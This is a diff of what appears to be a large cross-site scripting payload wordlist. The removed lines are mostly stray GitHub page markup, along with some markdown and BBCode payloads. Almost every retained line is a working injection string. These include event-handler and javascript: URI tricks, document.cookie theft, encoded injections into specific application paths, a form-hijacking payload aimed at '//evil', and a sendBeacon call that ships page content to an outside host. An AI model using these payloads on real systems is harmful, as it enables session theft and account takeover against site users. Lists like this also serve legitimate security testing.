@@ -22,7 +22,6 @@
 " onmouseover=alert(xss) ">
 " style="color: expression(alert(0));" a="
 " type=image src=null onerror=x " \' type=image src=null onerror=x \'
-" variant="small" hidden="hidden" type="button" data-view-component="true" class="button button--icononly button--invisible button--medium mr-1 px-2 py-0 d-flex flex-items-center rounded-1 color-fg-muted">  <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x-circle-fill button-visual">
 "!=prompt(9)!="
 "%0a/><script>//alert(1)//
 "%25prompt(9)%25"
@@ -2700,7 +2699,6 @@ ${alert(1337)}`' autofocus
 /contests?*onmouseover=
 /control/stream?contentid=<svg/onload=alert(1)>
 /cs/idcplg?idcservice=get_search_results&resulttemplate=standardresults&resultcount=20&frompageurl=/cs/idcplg?idcservice=get_dynamic_pageaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&pagename=indext&sortfield=dindate&sortorder=desc&resultstitle=xxxxxxxxxxxx%3cscript%3ealert(31337)%3c%2fscript%3e&dsecuritygroup=&querytext=(dindate+%3e=+%60%3c$datecurrent(
-/email/unsubscribed?email=test@gmail.com%27\%22%3e%3csvg/onload=alert(1337)%3e
 /filter/jmol/iframe.php?_use=%22};alert(1337);//
 /guest/users/forgotten?email=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
 /help/index.jsp?view=%3cscript%3ealert(document.cookie)%3c/script%3e
@@ -3209,8 +3207,6 @@ ${alert(1337)}`' autofocus
 <a href="&#1;javascript:alert(1)">click me<a>
 <a href="/"><img src="/mg/fm.gif" width="146" height="65" alt="ferruh mavituna logo" /></a>
 <a href="//javascript:99999999/1?/you_must_hit_return<svg onload=confirm(1)>/:0">right click open in new tab</a>
-<a href="/login?return_to=%2fcoffinxp%2fpayloads" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:837590532,&quot;auth_type&quot;:&quot;log_in&quot;,&quot;originating_url&quot;:&quot;https://github.com/coffinxp/payloads/blob/main/env.txt&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="6a71f6c22c6631411849d6842ba9b6b9494879e43b93c0f7106379f00febe48a" aria-label="you must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
-<a href="/login?return_to=%2fcoffinxp%2fpayloads" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;log_in&quot;,&quot;originating_url&quot;:&quot;https://github.com/coffinxp/payloads/blob/main/env.txt&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="6ab25960d5cd887b3523df5a218e05f3ac83e714388da25e4fcd915d017257ba" aria-label="you must be signed in to change notification settings" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
 <a href="123" id=x>test</a><script>x='javascript:alert(1)';</script>
 <a href="[a]java[b]script[c]:alert(1)">xxx</a>
 <a href="[a]java[b]script[c]:alert(101)">xxx</a>
@@ -3546,7 +3542,6 @@ ${alert(1337)}`' autofocus
 <a href=javas&#99;ript:alert(1)>
 <a href=javascript:alert(1)>
 <a href=javascript:alert(1)>click
-<a icon="repo-forked" id="fork-button" href="/login?return_to=%2fcoffinxp%2fpayloads" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:837590532,&quot;auth_type&quot;:&quot;log_in&quot;,&quot;originating_url&quot;:&quot;https://github.com/coffinxp/payloads/blob/main/env.txt&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="d578b962eb0c083a3d269fbf1022840066b13a8a984e762c3e4f87ee58fe089c" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
 <a id="x" href='http://adspecs.yahoo.com/adspecs.php' target="close(/*grabcookie(1)*/)">click</a><script>onblur=function(){confirm(4)}x.click();</script>
 <a id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a>
 <a id=x tabindex=1 onactivate=alert(1)></a>
@@ -5427,8 +5422,6 @@ ${alert(1337)}`' autofocus
 <button autofocus onfocusin=alert(1)>test</button>
 <button autofocus=x onchange='import'onfocus=popup=1; >
 <button contenteditable onbeforeinput=alert(1)>test
-<button data-close-dialog-id="custom-scopes-dialog" aria-label="close" type="button" data-view-component="true" class="close-button overlay-closebutton"><svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
-<button data-close-dialog-id="feedback-dialog" aria-label="close" type="button" data-view-component="true" class="close-button overlay-closebutton"><svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
 <button data=popup=1; id='x'onfocus=popup=1; >
 <button draggable="true" ondrag="alert(1)" style=display:block>test</button>
 <button draggable="true" ondrag="alert(1)">test</button>
@@ -5443,8 +5436,6 @@ ${alert(1337)}`' autofocus
 <button form=hijack_form_id formaction=//evil style="position:absolute;left:0;top:0;width:100%;height:100%"><plaintext> form hijacking <img src='//evil by @lcamtuf
 <button form=test onformchange=alert(1)>//injectx
 <button form=x>xss<form id=x action="javas&tab;cript:alert(1)"//
-<button id="action-menu-2476ca42-552f-4103-8421-0494e74f3e05-button" popovertarget="action-menu-2476ca42-552f-4103-8421-0494e74f3e05-overlay" aria-controls="action-menu-2476ca42-552f-4103-8421-0494e74f3e05-list" aria-haspopup="true" aria-labelledby="tooltip-5eee8efb-49bc-44b4-9d41-0313fd669a9a" type="button" data-view-component="true" class="button button--icononly button--secondary button--medium underlinenav-item">  <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal button-visual">
-<button id="icon-button-04edd2b3-ba23-46a4-8135-eff7bb01ff3f" aria-labelledby="tooltip-d877887e-49e1-4159-a02e-9fb8974ad633" type="button" data-view-component="true" class="button button--icononly button--invisible button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x button-visual">
 <button id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></button>
 <button id=x tabindex=1 onactivate=alert(1)></button>
 <button id=x tabindex=1 onbeforeactivate=alert(1)></button>
@@ -18176,67 +18167,6 @@ ${alert(1337)}`' autofocus
 <svg %09onload%09=prompt(1)>
 <svg </onload ="1> (_=alert,_(1)) "">
 <svg </onload ="1> (_=prompt,_(1)) "">
-<svg aria-hidden="true" height="12" viewbox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bookmark">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-right headermenu-trailing-link-icon">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-review">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-codespaces">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment-discussion">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot-error">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-credit-card">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-desktop">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-mobile">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-file-code">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-gift">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-globe">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-history">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external headermenu-external-icon color-fg-subtle">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-organization">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-package">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pencil">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-people">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-plus-circle">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-rocket">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search formcontrol-input-leadingvisual">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-server">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield-check">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table underlinenav-octicon d-none d-sm-inline">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-trash">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-workflow">
-<svg aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-code-review color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-code-square color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-codespaces color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-comment-discussion color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-copilot color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-issue-opened color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-shield-check color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-stack color-fg-subtle mr-3">
-<svg aria-hidden="true" height="24" viewbox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-workflow color-fg-subtle mr-3">
 <svg contenteditable onbeforeinput=alert(1)>test
 <svg contentscripttype=text/vbs><script>msgbox
 <svg contentscripttype=text/vbs><script>msgbox"@insertscript"<i> #ie9 #svg #vbscript
@@ -18252,7 +18182,6 @@ ${alert(1337)}`' autofocus
 <svg draggable="true" ondragleave="alert(1)">test</svg>
 <svg draggable="true" ondragstart="alert(1)" style=display:block>test</svg>
 <svg draggable="true" ondragstart="alert(1)">test</svg>
-<svg height="32" aria-hidden="true" viewbox="0 0 24 24" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github">
 <svg id=1 onload=confirm(1)>
 <svg id=?p=<script/src=//3237054390/1%2b onload=location=id>
 <svg id=?p=<svg/onload=alert(1)%2b onload=location=id>
@@ -18390,7 +18319,6 @@ ${alert(1337)}`' autofocus
 <svg onunload=http://window.open ('javascript:alert(1)')>
 <svg onunload=navigator.sendbeacon('//https://ssl.portswigger-labs.net/',document.body.innerhtml)>
 <svg onunload=window.open('javascript:alert(1)')>
-<svg opacity="0.5" aria-hidden="true" height="16" viewbox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down headermenu-icon ml-1">
 <svg version="1.1" baseprofile="full" xmlns="http://www.w3.org/2000/svg">
 <svg xml:base="data:text/html,<script>confirm(1)</script>"><a xlink:href="#"><circle r="40"></circle></a></svg>
 <svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributename="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
@@ -20514,25 +20442,13 @@ ${alert(1337)}`' autofocus
 [[#%3cscript%3ealert(1)%3c/script%3e|
 [\xc0][\xbc]script>alert('xss');[\xc0][\xbc]/script>
 [\xc0][\xbc]script>alert(1);[\xc0][\xbc]/script>" };
-[a](data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k)
-[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[a](javascript:prompt(document.cookie))
-[a]<? foo="><script>alert(1)</script>"><! foo="><script>alert(1)</script>"></ foo="><script>alert(1)</script>">[b]<? foo="><x foo='?><script>alert(1)</script>'>">[c]<! foo="[[[inception]]"><x foo="]foo><script>alert(1)</script>">[d]<% foo><x foo="%><script>alert(1)</script>">
-[a]<? foo="><script>alert(1)</script>"><! foo="><script>alert(1)</script>"></ foo="><script>alert(1)</script>">[b]<? foo="><x foo='?><script>alert(1)</script>'>">[c]<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">[d]<% foo><x foo="%><script>alert(1)</script>">
 [alert(1)]+
-[b][style="onmouseover="alert(1);]bold[/style][/b]
-[b][style="style=width:expre/**/ssion(alert(1))xt]bold[/style][/b]
-[citelol]: (javascript:prompt(document.cookie))
 [color=red width=expression(alert(123))][color]
 [color=red' onmouseover="alert('xss')"]mouse over[/color]
 [data "1<div style=width:expression(prompt(1))>"]
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[test](javascript://%0d%0aprompt(1))
-[test](javascript://%0d%0aprompt(1);com)
 [u+2028]confirm(1)
 [u+2028]prompt(1)[u+2028]-->
 [url=javascript:alert('xss');]click me[/url]
-[xss](javascript:confirm(6))
 \"));}catch(e){confirm(document.domain);}//
 \"));}catch(e){confirm(document.domain)}//
 \"));}catch(e){x=window.open('http://xss.cx/');settimeout('confirm(x.document.body.innertext)',4000)}//
@@ -21127,8 +21043,6 @@ eent/onblur.html
 eent/onfocus.html
 element[attribute='<img src=x onerror=alert('xss');>
 email.php?forum_contact=\"><script>foo</script>
-email/unsubscribed?email=test@gmail.com%27\%22%3e%3csvg/onload=alert(/xss/)%3e
-email/unsubscribed?email=test@gmail.com%27\%22%3e%3csvg/onload=alert(1337)%3e
 emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>
